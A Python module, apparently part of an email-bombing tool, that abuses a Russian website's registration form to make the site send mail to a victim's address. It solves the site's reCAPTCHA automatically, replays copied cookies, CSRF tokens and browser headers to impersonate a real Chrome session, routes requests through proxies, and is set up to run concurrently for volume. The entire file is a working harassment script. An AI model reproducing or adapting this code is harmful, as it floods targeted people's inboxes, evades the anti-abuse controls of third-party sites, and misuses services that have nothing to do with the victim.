from os.path import basename

import requests

from module import Spam

pageurl = 'https://ecovopros.ru/user/register'
googlekey = '6LeV9dMUAAAAAOwRFgW3-KEZvRdo4k_YDTJv8mL8'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(pageurl, googlekey)
        if not cap:
            return

        cookies = {
            '_ym_uid': '1676289976207198902',
            '_ym_d': '1676289976',
            '_csrf': '3a2d23377857ec496a7f6d6d7cd928ad6da9fea604ce89b23bffcdb90e77e0c2a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22y7r4Fex0l5tQujoM3YaRhG8vmiEUu3da%22%3B%7D',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
        }

        headers = {
            'authority': 'ecovopros.ru',
            'accept': '*/*',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ym_uid=1676289976207198902; _ym_d=1676289976; _csrf=3a2d23377857ec496a7f6d6d7cd928ad6da9fea604ce89b23bffcdb90e77e0c2a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22y7r4Fex0l5tQujoM3YaRhG8vmiEUu3da%22%3B%7D; _ym_isad=2; _ym_visorc=w',
            'origin': 'https://ecovopros.ru',
            'pragma': 'no-cache',
            'referer': 'https://ecovopros.ru/user/register',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'x-csrf-token': '9JTS8ziDRDIDTHDW_gUbuTnVDUcWfue6CHKCY1rMHdONo6DHfuY8Am95BIeLb3T0CoxsFX4538xlG8c2L_95sg==',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            '_csrf': '9JTS8ziDRDIDTHDW_gUbuTnVDUcWfue6CHKCY1rMHdONo6DHfuY8Am95BIeLb3T0CoxsFX4538xlG8c2L_95sg==',
            'register-form[role]': '10',
            'register-form[name]': 'test',
            'register-form[email]': target,
            'register-form[phone]': '71231231231',
            'register-form[organizationName]': 'test',
            'register-form[subscriptionType]': '2',
            'g-recaptcha-response': cap,
            'register-form[reCaptcha]': cap,
        }

        response = requests.post('https://ecovopros.ru/user/registration/register', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        print(response.text)

        return response


def main():
    s = 'отправлено письмо'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
